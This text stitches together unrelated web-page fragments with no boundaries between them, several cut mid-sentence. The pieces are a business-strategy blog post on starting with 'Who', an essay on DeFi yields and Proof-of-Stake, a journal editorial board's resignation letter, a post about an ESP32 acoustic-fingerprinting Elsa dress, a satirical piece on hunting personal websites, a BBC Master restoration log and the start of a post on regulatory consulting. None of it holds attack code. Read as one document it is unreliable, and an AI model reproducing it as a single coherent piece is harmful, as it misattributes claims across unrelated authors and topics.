<p>From this, he designed his ‘Golden Circle’ theory of building strategy.</p>

<p>All well and good, but I think there’s something missing here. Apple dominates the global handset market by capturing <a href="https://www.counterpointresearch.com/apple-continues-lead-global-handset-industry-profit-share/">66% of industry profits and 32%</a> of the overall handset revenue.&nbsp; But crucially, they weren’t trying to sell a smartphone to everyone.&nbsp; They are targeting a tight group of customers for whom the Apple ecosystem is part of their self-worth and their projection to the world.&nbsp;</p>



<p>When Steve Jobs returned and created the world-famous ‘Think Different’ campaign, Apple products were not the best. In fact, they were a bit shit.&nbsp; But Apple had identified a sub-set of people – creatives, misfits, dreamers – for whom owning a Mac said something about the sort of off-the-wall people they wanted to be. To my mind, this proves that you can’t have a ‘why’ unless you know ‘who’ your ‘why’ is going to appeal to.&nbsp;</p>



<h2><strong>Start with ‘Who’ not ‘Why’</strong></h2>



<p>Whilst the Golden Circle of ‘Why’, ‘How’ and ‘What’ is important, I think it’s missing something even more fundamental.&nbsp; A fourth circle – ‘Who’ – at the very centre.  This is where I believe you should start.</p>



<p>Surely your over-arching goal is to build a successful commercial enterprise?&nbsp; Well, I don’t think you can do this starting with ‘Why’.  Contrast Sinek’s view of strategy with that of Jim Collins – another great business author and speaker.&nbsp; His ‘Hedgehog Concept’ is something I refer to over and over again with my clients.  He believes that a successful strategy is formed from overlapping 1) What you are deeply passionate about (your ‘Why’) with 2) what you can be best at in the world and 3) what best drives your economic engine.&nbsp; It’s this third point that’s missing from Sinek’s viewpoint.  The commercial imperative that should drive every business.<br></p>



<figure><img src="https://lh5.googleusercontent.com/Cx5FchRgo-3Snm0OD1KjuGrClpCOD-06ZOpzwXwWeq9OY2rwZjotW0VHOM4q5zrzyyvHihLmUdxaCCz5KrCXCY1p8z0_qfvUy80TXtXHXUAMASWMxOA0VkAbcd2KAtkFTLly73Jw" alt="" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>Back in 1954, the sage-like grandfather of modern business, Peter Drucker, said, ‘There is only one valid definition of a business purpose: to create a customer’.&nbsp; I think this still holds true and yet many companies struggle to understand this fundamental concept.  There’s little point finding your meaning for existence and working out what you’re going to do, and how, if this doesn’t appeal to the right customers.&nbsp;</p>



<p>And yet this happens time and again.&nbsp; The CEO is on a mission but his company’s customers are leaving in droves.&nbsp; They don’t care.  Disaster can strike when there’s no clear idea about Core Customer.&nbsp; Take Chip Wilson, ex-CEO of Lululemon. His fat-shaming remarks about Lululemon’s yoga pants were a PR catastrophe for the company.&nbsp; He’d lost his grip on who his core customers were and, worse still, ended up insulting a good many of them.  The company has never truly recovered.</p>



<h2><strong>Finding your ‘Who’</strong></h2>



<p>Ultimately, you’re trying to create a tribe that love what you do and feel like they belong when they experience your company for the first time.&nbsp; I believe this should start with your staff.  <a href="https://www.monkhouseandcompany.com/blog/want-better-productivity-then-prioritise-happiness/">First and foremost, do your employees feel like they’re in the right place?</a>  And then, do your existing customers feel happy they made the right choice by picking your company?&nbsp; Only after you’ve got these two elements right will you attract new customers.&nbsp;</p>



<p>This is a different way of approaching marketing.&nbsp; Too often, the focus is on attracting new people through the door and then, when they arrive, losing them because everything’s not quite in sync.&nbsp; <a href="https://www.monkhouseandcompany.com/blog/7-top-tips-for-successful-recruitment/">Don’t build a recruitment process that attracts the wrong people</a>.  They’ll leave after a few months because your company is different from the expectation you created.&nbsp;</p>



<p>To build a tribe of customers, you need to get laser-focused on who these people are. &nbsp; Your guiding principle should be, ‘Who are the customers that will buy from us at maximum profit?’ Most of the time, my clients don’t have this.&nbsp; Since they started trading, they’ve attracted a broad array of customers, all looking for different things. This makes it hard to narrow down to the Core Customer that will ultimately drive their growth.</p>



<p>When we get to the nitty-gritty of working out their Core Customer, I guide clients to focus first and foremost on the ones who buy at maximum profit.&nbsp; Perhaps these customers buy the fullest range of services or have the potential to do so. Then we narrow it down to one who best represents the customers they need to target. We give them a name.&nbsp; A recent example is ‘Andrew’.  Then we start to profile this customer archetype – what is Andrew trying to do in his business?  Does he have a transformational challenge? Maybe he’s an agent of change in his organisation?&nbsp; What insights tell his story?  What is his background?&nbsp;</p>



<p>Then I get them to work out how Andrew is likely to buy – and where they fit in this buying journey.&nbsp; Finally, and most importantly, how do they want Andrew to feel when he signs on the dotted line?  This is why you need to start with ‘Who’ before working out your ‘Why’.&nbsp; Otherwise, you lose the connection between how you want them to feel when they do business with you and your purpose.  These need to interlock.</p>



<h2><strong>Creating a niche</strong></h2>

<p>A massive lightbulb moment is when clients realise they only need to attract a small number of these Core Customers, maybe 10 or 20, to double their business in the next three years.&nbsp; Brilliant! In the past, their strategy has been focused on average customers.  Now, they can tailor their entire approach to the needs of a specific group of Core Customers.</p>



<p>When I was at Peer 1 Hosting, we had 13,400 customers globally but only 500 of these were high value.&nbsp; I worked out we only needed another 100 net annually to achieve our growth plans of doubling in three years.&nbsp; So, we got really focused on who they were and what they needed from us.  This had far-reaching consequences – our core values and purpose were aligned around these needs. They guided every decision we made. We looked for staff who shared these values and could ensure our Core Customers knew, liked and trusted us.</p>



<p><a href="https://www.monkhouseandcompany.com/blog/why-you-need-nps-to-grow-your-business/">If you’re using NPS®</a> (Net Promoter Score), you need to make sure your score is higher for your Core Customer than any of your competitors. This is about being different.&nbsp; You’re not trying to be brilliant for every customer or the biggest or the best. You’ve identified attributes for your business that you know your Core Customer values and by delivering these, you’ll win.&nbsp;</p>



<p>This is how you create a niche.&nbsp; By getting inside the heads of a small number of high-value customers, you’ll own this small segment. Eventually, you will become the number one supplier of your ‘Who’.&nbsp; It’s like mining for a rich vein of gold.  Think small, not big, and use a feelings model to get there.  This will be way more effective than constantly selling the features and benefits of your product.</p>



<hr>



<p>So, take my advice. Don’t ignore Simon Sinek entirely. BUT&nbsp;start with ‘Who’ not ‘Why’.  By doing this, you’ll find a profitable purpose that drives the economic engine of your business.&nbsp; After all, you’re not just doing this for love.  Profit is also important!</p>

<p>In 2017/18 cryptocurrencies went through a speculative bubble that saw its flagship currency Bitcoin reach peaks of $20,089 and a market cap of $320 billion. At the height of euphoria, the total market cap of all cryptocurrencies reached $790 billion. While Bitcoin and other cryptocurrencies (known as altcoins) have been around since 2009, it was the consolidation of mindshare and public interest in 2017 and 2018 that has made it a mainstay for alternative investors. But the fact remains that we are yet to see the adoption event that will make it a mainstay for all investors.</p>



<p>Most recently Cryptocurrencies have once again found a place in the news cycle following two years of dormancy post the bubble. The central trend appears to be around the phenomenon of decentralised finance otherwise known as DeFi. The quantity of activity and community participation in DeFi and related activities have been pointed to as potential indicators of a return to the speculative mania that took place in 2017. By the end of July, the total value locked up in DeFi related projects was $4 billion. A somewhat marginal amount given that Bitcoin is now over $200 billion in valuation and the whole market for cryptocurrencies is approaching $350 billion.</p>



<p>Regardless, DeFi represents a strong use case for cryptocurrencies as a means to provide lending and borrowing capabilities and is also geared to attract significant speculative interest. One of the most basic and pervasively engaged features of DeFi at present is yield farming. Cryptocurrency assets can earn or ‘farm’ yields in three main forms:</p>



<ol><li>Participating in financial products as one would in traditional markets</li><li>Locking up some cryptocurrency liquidity in return for an interest-like reward.</li><li>Staking cryptocurrency (like collateral) to fortify the security of a Proof-of-Stake based blockchain platform, where ‘staking’ some tokens prevents malicious activity similar to how a collateralized loan prevents default risk.</li></ol>



<p>However, the attention decentralised finance (DeFi) is getting right now, looks more like a bubble than a catalyst for adoption, where volatility (price, scams, hacks etc) of the industry hasn’t been solved.</p>



<p>The question then is, what is a catalyst for adoption? Given that financial products (form 1) on any platforms, blockchain or otherwise, can provide yields through participation, let us focus on yield farming native to the nature of blockchain (forms 2 &amp; 3), Proof-of-Stake – where providing security/liquidity returns yields.</p>



<p>Proof-of-Stake is simply the mechanism whereby a decentralised platform is able to provide security against attacks on the immutability of the ledger on the blockchain. The name holds the key to understanding this mechanism where ‘staking’ (locking up) the currency on the platform, is the means by which you are able to validate transactions on the ledger (the state of the blockchain) and add to the ledger. The game theory of securing the chain via staking is tied to rewards for being a good actor and penalties for being a bad actor. These rewards represent the yields earned for securing the chain.</p>



<p>What is particularly interesting as the speculation starts to ramp up once more is that Proof-of-Stake based platforms are gaining more attention because of their ability to provide yields in return for a financial stake in the platform. Yields on a Proof-of-Stake network represents a passive income avenue for a spectrum of individual/retail investors all the way to institutional players. This differs from the Proof-of-Work mechanism, most popularly represented by Bitcoin, which consumes electricity (mining) to secure the ledger. Where mining BTC is more difficult and less accessible to the spectrum of investors (currently there are a few large mining farms that make this their primary occupation) most BTC investors will make capital gain returns based on price appreciation through adoption. In the absence of BTC becoming a true global currency it will depend on a series of consolidating speculative bubbles to edge toward adoption – a chicken and egg problem perhaps sped along by the more consistent rewards associated with Proof-of-Stake.</p>



<h3>Yields: A Ponzi scheme or a catalyst for cryptocurrency adoption?</h3>



<p>Thus far the speculation on the future potential of blockchain technology, and cryptocurrencies by extension, is what gives the industry the large valuation it holds, even as use cases seem scarce or utilised by few.</p>



<p>In such a case, providing yields for no inherent value due to lack of use case, appears more like a Ponzi scheme than investment in a nascent technology. The idea is that when more people take a financial stake in the platform and lock up those funds for yields, all the prior participants will continue to benefit, not only from the yields but also from the price appreciation of the currency and market capitalisation of the platform. Of course, the integrity of the platform will only be realised when the use cases are actualised at some point in the future. In the interim, the Ponzi characteristics are exacerbated by the lucrative yield returns (often ranging from 5-20% per annum) made available by Proof-of-Stake networks, in comparison to traditionally available yield/interest earning financial products. It’s important to note that platforms vary in risk and reliability, we can liken it to investing in financial products across different tranches – some more junk-like than others.</p>



<p>Bitcoin, on the other hand, provides an entirely different avenue of investment in blockchain but comes with its own set of challenges – namely the chicken and egg problem we discussed above. Bitcoin requires the expense of electricity through mining activities to secure the network and ‘earn’ Bitcoin. While the rewards for mining on a Proof-of-Work network can be equated to the yields earned for staking on a Proof-of-Stake network, the ‘work’ performed for Proof-of-Work (cost of time and initial investment) makes it impossible for it to operate like a Ponzi scheme. Essentially, this means that Bitcoin can’t propagate its adoption through the mechanism of mining, where mining does not lend itself to the low-effort traits of Proof-of-Stake currently attracting attention to the DeFi bubble.</p>



<p>The lower effort in work required to secure the Proof-of-Stake network allows more users to participate meaningfully and earn yields. This is the beginning of a solution to the chicken and egg problem, where increased participation can bolster the market capitalisation required for widespread traction. In summary, easier participation increases the likelihood of network effect for a platform, where earning yields becomes the initial use case for the platform – as risky or unreliable as it may seem. Increased traction over time is very capable of evolving the volatile and Ponzi-like DeFi space into a mature financial structure supporting the blockchain ecosystem.</p>



<p>During 2017/18 the prevailing narrative of Proof-of-Work and crypto’s use case as a currency was not substantiated and resulted in a bubble rather than an adoption event. While it gained attention on the global stage, the widely held perception was that there was no immediately apparent use case that could sustain and grow its valuation beyond pure speculation. In the last couple of years following the bust of the speculative bubble, Proof-of-Stake has become a more significant narrative for the industry. The most marked indicator being Ethereum (currently Proof-of-Work), the second largest cryptocurrency, indicating its intent to transition to a Proof-of-Stake network.</p>



<p>The narrative of Proof-of-Stake is ballooning out quite rapidly, popularly considered to be propagated by the perceived benefits for scaling transaction capacity. However, what we have identified is that the use case of earning yields has the potential to catalyse the next boom cycle similar to 2017/ 18, and perhaps even to a greater extent. Even in the absence of yields as a catalyst for the next boom cycle, it represents a solid use case as a financial ecosystem to sustain speculative value and drive cryptocurrencies closer to mainstream use.</p>

                  <p>August 25, 2020<br></p>
                  
                  <p>Dear Colleagues,<br></p>
                  
                  <p>We would like to inform you about an upcoming major transition for the Journal of Field Robotics.<br></p>
                  
                  <p>After 15 years of service, John Wiley and Sons, the publisher has decided not to renew the <br></p>
                  <p>contract of the Editor in Chief (Sanjiv Singh) and the Managing Editor (Sanae Minick) and <br></p>
                  <p>hence our term will expire at the end of 2020.<br></p>
                  
                  <p>This comes after two years of discussions between new Wiley representatives and the <br></p>
                  <p>Editorial Board have failed to converge to a common set of principles and procedures by <br></p>
                  <p>which the journal should operate. The Editorial Board has unanimously decided to resign.<br></p>
                  
                  <p>We do want to assure the authors who have papers under review that we see it as our <br></p>
                  <p>responsibility to bring these documents to resolution during our term. We will continue to <br></p>
                  <p>process new submissions until the end of the year. More about the future at the end of this note.<br></p>
                  
                  <p>While the issue at the heart of our disagreement with Wiley is about academic independence, <br></p>
                  <p>it should be noted that there is a structural issue here. Scholarly publishing is broadly in flux <br></p>
                  <p>at the moment in the search for a sustainable model. Currently, academics are not paid to <br></p>
                  <p>create and review articles.&nbsp; In fact, they often have to pay fees to publish, and, readers have <br></p>
                  <p>to pay to access the work through a pay per view system, or, through subscriptions. <br></p>
                  <p><a title="https://www.coalition-s.org" href="https://www.coalition-s.org/">Plan S</a>, an international consortium makes the dilemma clear:<br></p>
                  
                  <p>"Monetising the access to new and existing research results is profoundly at odds <br></p>
                  <p>with the ethos of science (Merton, 1973 )… In the 21st century, science publishers <br></p>
                  <p>should provide a service to help researchers disseminate their results. They may <br></p>
                  <p>be paid fair value for the services they are providing, but no science should be locked <br></p>
                  <p>behind paywalls!"<br></p>
                  
                  <p>While this moment calls for creativity and collaboration with the scholarly community to find <br></p>
                  <p>new models, Wiley is intent on making broad changes to the way that the Journal of Field <br></p>
                  <p>Robotics is operated, guided mostly by an economic calculation to increase revenue and <br></p>
                  <p>decrease costs. To do this, they have unilaterally decided to change the terms of the <br></p>
                  <p>contract that has been constant since the JFR was started in 2005. Wiley has confronted a <br></p>
                  <p>similar case (European Law Journal) with similar effect— <a onclick="window.open(this.href); return false;" title="https://europeanlawblog.eu/2020/02/04/what-a-journal-makes-as-we-say-goodbye-to-the-european-law-journal/" href="https://europeanlawblog.eu/2020/02/04/what-a-journal-makes-as-we-say-goodbye-to-the-european-law-journal/" onkeypress="window.open(this.href); return false;">the entire editorial board has <br></a></p>
                  <p><a onclick="window.open(this.href); return false;" title="https://europeanlawblog.eu/2020/02/04/what-a-journal-makes-as-we-say-goodbye-to-the-european-law-journal/" href="https://europeanlawblog.eu/2020/02/04/what-a-journal-makes-as-we-say-goodbye-to-the-european-law-journal/" onkeypress="window.open(this.href); return false;">resigned in January of 2020:</a><span><br></span></p>
                  
                  <p>Wiley insists that the new contract is covered under a confidentiality agreement that not even <br></p>
                  <p>the Editorial Board can examine. What we can say is that the net effect of Wiley’s demands <br></p>
                  <p>would make the Editors contractors to the publisher rather than having them respond to the <br></p>
                  <p>board. We see this as a breach of academic autonomy.<br></p>
                  
                  <p>In resigning, the Editorial Board of the Journal of Field Robotics reaffirms its commitment to <br></p>
                  <p>dissemination and discussion of research. In the near future we will announce a new forum <br></p>
                  <p>for research in Field Robotics that will maintain the academic integrity of our editorial process <br></p>
                  <p>while also ensuring open dissemination of your research.<br></p>

<span><a href="https://0110.be/posts/Olaf_-_Acoustic_fingerprinting_on_the_ESP32_and_in_the_Browser">»</a> By <a href="https://0110.be/users/Joren">Joren</a> on Thursday 20 <a href="https://0110.be/date/2020/8">August 2020</a></span>
<p><img alt="Recognition of music." src="https://0110.be/files/attachments/475/web_embedded_olaf.jpg"> A good year ago I was asked to develop audio recognition technology for an e-costume. The idea was that <i>lights in the costume would follow a sequence synchronised to a certain song</i>. Only a single song should trigger the lights, all other music should be ignored. Recognition of music and synchronisation is typically done using audio fingerprinting techniques. The challenge was that the recognition needed to run on a cheap, battery-powered microcontroller with limited <span>CPU</span> and memory. I delivered a prototype but eventually a cheap, battle-tested, off-the-shelf, IP-cleared, alternative was found.</p>
<p>The prototype gathered dust for a while but the idea stuck in my head. With my daughters fourth birthday approaching during the lockdown, I decided to turn the prototype into an over-engineered birthday gift and let an ‘Elsa-dress’ react to ‘Let It Go’ from the Frozen soundtrack. With the prototype as a starting point, I ordered an <span>RGB</span>-<span>LED</span>-strip, a beefy Li-Ion Battery, an I2S digital microphone and, of course, an Elsa-dress.</p>
<p>I had an ESP32 microcontroller laying around and used it as the core of the system: it supports <a href="https://en.wikipedia.org/wiki/I%C2%B2S">I²S</a>, has a floating point unit (<span>FPU</span>), is easy to use together with <span>LED</span> strips and has enough memory. The <a href="https://en.wikipedia.org/wiki/Floating-point_unit"><span>FPU</span></a> makes it straightforward to use the same code on traditional computers as on embedded devices: fixed-point math can be avoided.</p>
<p>After soldering the components together and with the help from my better half to sew in the <span>LED</span> strip, it all came together. In the video below, the result of our work can be seen. The video first shows a song that should not and is not recognised. Then, “Let It Go” is played and correctly recognised. After the song is stopped, the lights go on for a while and finally stop: this is by design to allow gaps in recognition. Lastly, the song is continued and again correctly recognised.</p>

</video>
</center>
<p>With my limited C experience the prototype code was not well organised. During my second attempt this improved enough so that I feel comfortable enough to share the code on GitHub: <a href="http://github.com/JorenSix/Olaf">Olaf – Overly Lightweight Acoustic Fingerprinting</a>. The code went through several iterations and was expanded beyond the original scope and became <b>a capable general purpose acoustic fingerprinting system</b> with its <a href="https://0110.be/publications/Applications_of_Duplicate_Detection_in_Music_Archives%3A_from_Metadata_Comparison_to_Storage_Optimisation">many applications</a>. Olaf performs quite well thanks to its resource friendly design and the use of <a href="https://bitbucket.org/jpommier/pffft/src/master/"><span>PFFT</span></a> and <a href="http://www.lmdb.tech/doc/"><span>LMDB</span></a>. Especially <span>LMDB</span>, a fast, B+-tree backed key value store with low storage overhead enables performant storage and lookups.</p>
<h3><span>WASM</span>: Olaf in the browser</h3>
<p>Olaf, being written in <span>ANSI</span> C, can run in the browser thanks to the <a href="https://emscripten.org/">Emscripten</a> compiler. According to its website, Emscripten <i>‘…lets you run C and C++ on the web at near-native speed without plugins’</i> Combining the Web Audio <span>API</span> and the <span>WASM</span> version of Olaf makes web-based acoustic fingerprinting applications possible.</p>
<p>Below you can try out Olaf. The <i>exact same code</i> is running on your browser as on the ESP32 demonstrated above. This means that Olaf is listening to recognise ‘Let It Go’ from the Frozen soundtrack. For your convenience the song can be started below on the left. On the right, you can start Olaf by allowing incoming audio to be analysed. The <span>FFT</span> is calculated by Olaf and visualised using <a href="https://www.pixijs.com/">Pixi.js</a>. After a few seconds the red fingerprints should become green, indicating a match. Once you stop the song, the fingerprints will eventually turn red again. As with the video above: going from a match to no match takes a couple of seconds to allow gaps in recognition.</p>

<p><small>1. Start the song and play it aloud. Singing along is encouraged.</small>
<small>2. Start the microphone and check whether recognition succeeds.</small>

      lives mostly unobserved in the jungle of the Internet.  A few 
      inexperienced Internet users who live completely within the 
      golden-walled gardens of Facebook and Google may not even be 
      aware of the species' existence.  Other inexperienced users 
      may consider the personal website to be either extinct, like 
      brontosaurus, or a myth, like 
      <a href="https://www.smithsonianmag.com/history/why-bigfoot-and-abominable-snowman-loom-large-human-imagination-180975365/">Bigfoot 
      or the Abominable Snowman</a>.  The truth is that many 
      specimens exist in the wild, but in order to successfully 
      hunt the personal website, a hunter must know the habits of 
      this species well.</p>

   <p>Please allow me to be your guide on this safari through the murky 
      and predator-filled Internet jungle, and I will lead you to 
      some representative specimens of the personal website species and 
      teach you hunting methods that are likely to lead you to others.</p>

   <p>As legend has it, during a more peaceful time, soon after the 
      genesis of the Internet jungle and before the mid 1990's, personal 
      websites were the predominant species.  But queen Sophia the 
      demiurge, wife of King Berners-Lee, at the pleading of her daughter 
      Pandora, acquiesced to provide a breeding ground for Pandora's 
      pets.  Over time, more and more pets were allowed to roam free in 
      the jungle, including not a few predators.  Eventually, these 
      pets became the predominant species of the Internet jungle and 
      personal websites became nearly invisible among all the bellowing 
      and commotion raised by Pandora's pets.  This near invisibility made 
      personal websites very difficult to hunt.</p>

   <p>Before discussing personal websites in detail, I should first 
      mention two common predators in the Internet jungle.  The 
      corporate predator induces the Internet user to willingly approach 
      him by pretending to be a harmless domesticated animal, much like 
      a horse or a cow.  Note that not all corporate websites are 
      predators, though a large number of them do have certain 
      similarities to cows, ponderousness often being one.  But, many 
      corporate websites are not nearly as domesticated as they appear.  
      Just read the details of their terms-of-service agreements if you 
      doubt this.  As with many humans and their cats, the truth is 
      that deciding in any given instance whether a corporate website 
      or its Internet user is the dominant species can be a difficult 
      task.</p>

   <p>A less well understood animal is the hacker.  Hacker is a genus 
      containing a number of species.  Some are predatory, and others 
      are harmless or even beneficial to the ecology of the Internet 
      jungle.  By far, the most populous species of predatory hacker is 
      the "script kiddie".  Script kiddies tend to be blind, feeling 
      their way around the Internet jungle from IP address to IP 
      address.  Their goal seems to be to find those websites that have 
      ingested corporate website code that has made them susceptible to 
      infection.  When a script kiddie finds such a website, it 
      frequently injects malware, which it sometimes uses to help it find 
      and attack other websites.</p>

   <p>The reason for the script kiddie's behavior remains a mystery, 
      since it usually provides little nourishment.  Some script kiddie 
      observers speculate that script kiddies engage in the noted 
      behavior simply to impress others of their species.  While other 
      animals must impress potential mates in order to improve the 
      genetics of their offspring, most potential mates of script kiddies 
      seem unimpressed by their behavior.  A possibility also exists that 
      the script kiddie's behavior serves primarily as a means of 
      determining pecking order, primarily among males of the species.  
      However, one observation that tends to bolster the mating theory is 
      that most script kiddies that have successfully mated no longer 
      engage in their typical behavior.</p>
  
   <p>Even many moderately experienced hunters fear the personal 
      website, because they have been led to believe that personal 
      websites frequently carry diseases--viruses in particular, or 
      parasites generally known as "malware".  Though both of these are 
      possible, they are uncommon.  The truth is that personal websites 
      practice habits that are generally no less cleanly than other 
      Internet jungle species.  However, some of the less wary personal 
      websites do become susceptible to viruses and malware by ingesting 
      code defecated by corporate websites, including code from the unusually 
      flatulent and dyspeptic Microshaft.  Nevertheless, hunters' fear of 
      personal websites is largely overblown. 
      <a href="https://cheapskatesguide.org/articles/no-such-thing-as-secure.html">Well-equipped</a>
      hunters have little to fear.</p>

   <p>Unlike most other animals that must constantly evade predators 
      to survive, the personal website has few known enemies.  The 
      personal website is, however, susceptible to the DMCA parasite, 
      which is capable of suing it to death.  Fortunately, this is a rare 
      occurrence, perhaps mainly due to the near invisibility of the 
      personal website.  For this reason, and because personal websites 
      are almost always so small that they have very little meat on them 
      (otherwise known as posts or articles), they are rarely in 
      danger from predators.  Personal websites also tend to 
      taste bad to the larger corporate predators, as they rarely 
      advertise or produce much of an income.  Very rarely, however, a 
      well-fed personal website may grow to a large enough size 
      to successfully compete with corporate websites for the food provided 
      by users.  When this occurs, some observers fear this fat 
      personal website may be in danger of being killed (see 
      <a href="https://johnfowler.co/facebook-blocked-my-website/">here</a>, 
      <a href="https://heavy.com/news/2018/10/facebook-purge-list-deleted-accounts/">here</a>, 
      <a href="https://www.convinceandconvert.com/social-media-strategy/3-ways-facebook-is-killing-your-website/">here</a>, 
      and <a href="https://www.ndtv.com/world-news/why-does-google-steal-content-from-honest-businesses-us-congressman-2271102">here</a>), 
      but few corporate predators ingest even the fattest personal 
      websites, perhaps because they simply do not know what to do with 
      them.  On rare occasions, however, corporate predators will capture 
      both personal and non-revenue-generating corporate websites and 
      allow them to live for a few more years while dying 
      <a href="https://techcommunity.microsoft.com/t5/healthcare-and-life-sciences/skype-for-business-online-end-of-life-july-31-2021/ba-p/779137">slow 
      deaths from starvation</a>.</p>

   <p>Unlike other animals that are seen or heard mainly at mating time, 
      personal websites do not reveal their presence in this manner, 
      because they do not mate.  Instead, they reproduce asexually.  Some 
      produce offspring by budding, a plantlike characteristic.  Many, if 
      not most, also exhibit another plantlike characteristic.  They 
      sprinkle their spoors (technically, known as hyperlinks) over the 
      floor of the Internet jungle in the hope of being one day chanced 
      upon by an Internet user and ingested.  Though ingestion rarely 
      occurs, when it does, through some process not well understood by 
      present-day science, the Internet user is occasionally induced to 
      create his own personal website.  This website is then free to bud 
      under the careful attention and care of the host Internet user, who 
      has now been transformed into an entity sometimes known as a 
      "developer", though developer is not an especially well-defined 
      designator.  At the proper time, the new website naturally begins 
      to produce its own spoors, and its life cycle repeats.</p>

   <p>Sometimes, spoors and bits of code are exchanged directly with other 
      personal websites, in a manner analogous to bacterial conjugation, 
      in which genetic material, called plasmids, are exchanged between 
      bacteria.  This type of spoor is known as a "backlink".  Sometimes, 
      websites collect backlinks and place them in groups called 
      blogrolls.</p>

   <p>As alluded to previously, the main reason personal websites are so 
      difficult to find in the Internet jungle is that they are almost 
      completely invisible to the bloodhounds of the Internet, known
      as "search engines".  Search engines use search algorithms, 
      rather than smell, to find websites.  Except on rare occasions, the 
      only search in which a personal website appears on <i>any page</i> 
      of a search result is a search that includes the personal website's 
      exact domain name (its location in the Internet jungle) 
      or the exact title of one its articles.  
      Therefore, less than a hundred of the most popular personal websites 
      can be found through the overwhelming majority of Internet 
      searches.  Though this may be hard to believe, it is true.</p>

   <p>Even the smaller search engines like millionshort.com, 
      swisscows.com, and wiby.me are largely blind to any personal 
      websites other than the top 100.  Internet zoologists speculate 
      that smaller search engines are not actually blind to personal 
      websites.  They only pretend to be blind by keeping their eyes 
      tightly closed whenever they encounter a personal website, so as to 
      imitate their leader, the Google search engine, which is truly blind 
      to all but the top 100 or so personal websites.</p>

   <p>Due to the lack of attention that personal websites receive, they 
      often congregate together, or at least maintain an association with 
      others of their kind.  They do this for survival.  You see, personal 
      websites need some amount of attention to survive.  If they cannot 
      get attention from Internet users, they try to get it from each 
      other.  This is the primary behavior by which an experienced hunter 
      may successfully track them.</p>

   <p>When by the greatest stroke of luck, a hunter happens to stumble 
      upon a nearly-invisible personal website, he should immediately look 
      for others …</p></div></div>

<p>…or ELITE simply rulez!! 😀</p>
<h4>Intro</h4>
<p>Some time ago, I wrote a post about <a href="https://retrohax.net/beeb-errr-bbc-micro-restoration-and-upgrades/">BBC Micro restoration and upgrades.</a> This time, I present you a BBC Master – Beebs bigger brother 🙂</p>
<p>I’ve bought this BBC Master some time ago. It was sitting on a shelf for quite a while but finally, I’ve managed to start working on it. This time again, it was a custom order for my friend Wendell (cheers mate:)</p>
<p>Do I have to mention that it was sold as “For parts – non-working” ? :&gt;</p>
<p>Well, as it turned out, it wasn’t in a dramatic shape but required refreshing and upgrades.</p>
<p>Here is how it looked.</p>

<p>Case fixes were easy. I only had to fix a broken screw stud and fix some cracks with metal mesh and soldering iron.</p>
<p>Later, it was cleaned and retr0brighted. Simple stuff.</p>

<h4>Power supply fix and hack</h4>
<p>Before powering it on, I wanted to make sure that PSU is working properly. PSUs in Beeb and Master use caps that tend to explode and are worth checking before supplying power to it. My unit confirmed that. I had to replace these caps which was an easy job.</p>
<figure><img src="https://i1.wp.com/imgur.com/1u0gIIQ.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/1u0gIIQ.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>

<p>Wendell asked me to try making this unit usable in the US and in the EU. This simply means that PSU has to be a bit more flexible and should accept 110VAC/60HZ (USA) and 230VAC/50Hz (EU)</p>
<p>I was very lucky because this BBC had a San Hua Tien PSU inside and it turned out that it supports both working modes depending on a jumper setting.</p>

<p>I’ve simply added some wires and a switch. I only had to make a nice hole in PSUs metal case and I was golden 🙂</p>

<h4>Keyboard</h4>
<p>In the meantime, I’ve managed to clean up a keyboard. </p>

<h4>PCB cleaning and speaker fix</h4>
<p>Next, I’ve moved to PCB cleaning. As usual, I’ve dumped it into my ultrasonic cleaner to get rid of these nasty white crystalline structures. I’ve also replaced a broken speaker with the 8 Ohm speaker that I’ve found in one of my drawers 🙂</p>

<h4>Batter mod</h4>
<p>Finally, I could power it on and test if everything works … NOT</p>

<p>With the help of guys from an excellent <a href="http://stardot.org.uk/">stardot.org.uk</a> forum, I’ve managed to pinpoint a problem. It turned out that this is a common issue with BBC Master, and my unit was simply missing a battery. Looks like the previous owner removed it to prevent leakage and corrosion.</p>
<p>I’ve ordered a 3xAA battery case from <a href="http://www.retroclinic.com/">Mark of RetroClinic</a> and it worked like a charm. It has a diode soldered in-line to prevent batteries from charging. The downside is that batteries have to be replaced from time to time but still, this is a way better solution than the original one.</p>

<h4>RPI Zero as a co-pro</h4>
<p>While looking for a solution to my previous battery problem on <a href="https://stardot.org.uk/forums/">stardot forums</a>, I’ve stumbled across the same mod as in <a href="https://retrohax.net/beeb-errr-bbc-micro-restoration-and-upgrades/">BBC Micro post</a> – Rpi Zero as a co-pro. This time it is an internal mod and again, it is made by <a href="http://www.retroclinic.com/">Mark of retroclinic.com</a>.</p>
<p>He’d send it to me along with a battery tray and one more cool gear that I will talk about later 😉</p>
<p>It is mounted straight onto a BBC Masters PCB.</p>

<h4>External GOTEK</h4>
<p>The last add-on that I’ve got from Mark was a GOTEK with an OLED, all needed gear and a filled USB flash drive for it.</p>
<p>It is a very convenient solution for BBC Master and as expected, works like a charm 🙂</p>

  <article>
    <p>I’m back from cryosleep. After <a href="https://www.eidel.io/2020/01/31/pioneers-vs-process-people/">leaving Merantix Healthcare</a> 7 months ago I haven’t
been writing much. I took the summer off to finish my pilot’s license and to try out a few things on the
side.</p>

<p>One of them was doing regulatory consulting for medical software startups. Remember: At Merantix Healthcare
(now: Vara), we managed to pass all regulatory hurdles to bring our Machine Learning - based Radiology
software to market. At the time I thought this was quite an unspectacular achievement, but apparently many
other companies fail at it.</p>

<p>So, shortly after becoming unemployed, random people started emailing me with requests like “Hey, work as a
consultant for us, we pay you money, start tomorrow”. I started calling it the <em>magical consulting business
with zero marketing</em>.</p>

<p>It’s not like I was keen to do it, but it was worth a try.</p>

<p>I approached it with an open mind. Half a year later, after having succesfully worked with four companies,
here’s my verdict: It sucks.</p>

<p>Why? Many reasons. But let’s take a step back first.</p>

<p>What is regulation? (Bear with me) in human language, <em>regulation</em> is a list of hoops some authority puts in
your way of accessing the market. Everyone in your industry has to jump through these hoops.</p>

<p>Here’s the thing: In a sane world, with rational people, we wouldn’t need any regulation. People would be
building perfectly safe software. Like, they wouldn’t write buggy code that crashes and <a href="https://en.wikipedia.org/wiki/Therac-25" target="_blank">shoots high doses of
radiation at patients</a>.</p>

<p>Having perfect software is a utopic scenario. Software is never perfect. And even if most people build safe
